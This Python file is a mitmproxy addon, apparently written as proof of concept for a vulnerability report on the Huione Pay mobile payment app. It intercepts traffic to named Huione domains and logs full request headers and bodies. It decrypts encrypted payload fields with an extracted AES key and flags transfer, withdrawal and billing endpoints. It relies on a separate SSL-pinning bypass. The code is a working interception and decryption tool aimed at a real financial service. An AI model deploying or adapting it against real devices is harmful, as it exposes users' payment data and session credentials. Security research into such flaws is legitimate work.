#!/usr/bin/env python3
"""
mitm_huione.py - Huione Pay Traffic Analyzer (mitmproxy addon)
==============================================================
Research tool to capture and decrypt Huione Pay API traffic for
security analysis. Demonstrates the impact of the hardcoded AES key
vulnerability (VULNERABILITY_REPORT.md Finding #1, CVSS 9.8).

What this demonstrates:
  - SSL/TLS traffic can be decrypted using the extracted hardcoded key
  - All API requests/responses are captured in JSONL format
  - Encrypted "data" fields are automatically decrypted

Usage:
  Set HUIONE_AES_KEY env var, then:
    mitmproxy -s mitm-proxy.py
    mitmweb  -s mitm-proxy.py
    mitmdump -s mitm-proxy.py

Prerequisites:
  - SSL pinning bypass active (see frida-hooks/ssl-bypass.js)
  - mitmproxy CA cert installed on device
  - pip install mitmproxy pycryptodome
"""

import json
import os
import base64
from datetime import datetime
from urllib.parse import unquote

from mitmproxy import http, ctx

try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import unpad
    HAS_CRYPTO = True
except ImportError:
    HAS_CRYPTO = False

# AES key from environment — demonstrates hardcoded key vulnerability
_key_str = os.environ.get("HUIONE_AES_KEY", "")
HUIONE_AES_KEY = (_key_str.encode()[:32].ljust(32, b'\x00')) if _key_str else b'\x00' * 32

HUIONE_DOMAINS = [
    "app.hh3721.com",
    "open.huione.com",
    "pay2.huione.com",
]

LOG_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "traffic_captures")
os.makedirs(LOG_DIR, exist_ok=True)
LOG_FILE = os.path.join(LOG_DIR, f"traffic_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jsonl")


def aes_decrypt(data_str: str) -> str:
    """Decrypt AES-256-ECB encoded response data field."""
    if not HAS_CRYPTO or not data_str or not _key_str:
        return data_str
    try:
        raw = base64.b64decode(unquote(data_str))
        cipher = AES.new(HUIONE_AES_KEY, AES.MODE_ECB)
        return unpad(cipher.decrypt(raw), AES.block_size).decode("utf-8")
    except Exception as e:
        return f"[decrypt_error: {e}]"


def is_huione(flow: http.HTTPFlow) -> bool:
    host = flow.request.pretty_host
    return any(d in host for d in HUIONE_DOMAINS) or "hh3721.com" in host


def log_entry(entry: dict):
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(json.dumps(entry, ensure_ascii=False, default=str) + "\n")
    except Exception as e:
        ctx.log.error(f"[LOG ERROR] {e}")


class HuioneTrafficAnalyzer:

    def load(self, loader):
        ctx.log.info("=" * 60)
        ctx.log.info("[HUIONE ANALYZER] Traffic capture started")
        ctx.log.info(f"[HUIONE ANALYZER] Output: {LOG_FILE}")
        ctx.log.info(f"[HUIONE ANALYZER] AES decrypt: {'ACTIVE' if HAS_CRYPTO and _key_str else 'INACTIVE (set HUIONE_AES_KEY)'}")
        ctx.log.info("=" * 60)

    def request(self, flow: http.HTTPFlow):
        if not is_huione(flow):
            return

        endpoint = flow.request.path.split("/")[-1].split("?")[0]
        entry = {
            "ts":       datetime.now().isoformat(),
            "type":     "REQUEST",
            "method":   flow.request.method,
            "url":      flow.request.pretty_url,
            "headers":  dict(flow.request.headers),
        }

        body = flow.request.get_text()
        if body:
            try:
                body_json = json.loads(body)
                entry["body"] = body_json
                if isinstance(body_json, dict) and isinstance(body_json.get("data"), str):
                    dec = aes_decrypt(body_json["data"])
                    try:
                        entry["body_decrypted"] = json.loads(dec)
                    except Exception:
                        entry["body_decrypted"] = dec
            except Exception:
                entry["body_raw"] = body[:2000]

        log_entry(entry)
        ctx.log.info(f"[REQ] {flow.request.method} /{endpoint}")

    def response(self, flow: http.HTTPFlow):
        if not is_huione(flow):
            return

        endpoint = flow.request.path.split("/")[-1].split("?")[0]
        body = flow.response.get_text()
        resp = None
        try:
            resp = json.loads(body) if body else None
        except Exception:
            pass

        entry = {
            "ts":     datetime.now().isoformat(),
            "type":   "RESPONSE",
            "url":    flow.request.pretty_url,
            "status": flow.response.status_code,
        }

        if resp:
            entry["body"] = resp
            if isinstance(resp, dict) and isinstance(resp.get("data"), str) and len(resp["data"]) > 20:
                dec = aes_decrypt(resp["data"])
                try:
                    entry["body_decrypted"] = json.loads(dec)
                except Exception:
                    entry["body_decrypted"] = dec
        else:
            entry["body_raw"] = (body or "")[:2000]

        log_entry(entry)
        code = (resp or {}).get("code", flow.response.status_code)
        ctx.log.info(f"[RSP] /{endpoint} → code={code}")

        # Flag sensitive endpoints for researcher attention
        if any(kw in flow.request.pretty_url for kw in ["transfer", "withdraw", "recharge", "bill"]):
            ctx.log.warn(f"[FINANCE ENDPOINT] {endpoint} — see {LOG_FILE} for decrypted data")


addons = [HuioneTrafficAnalyzer()]
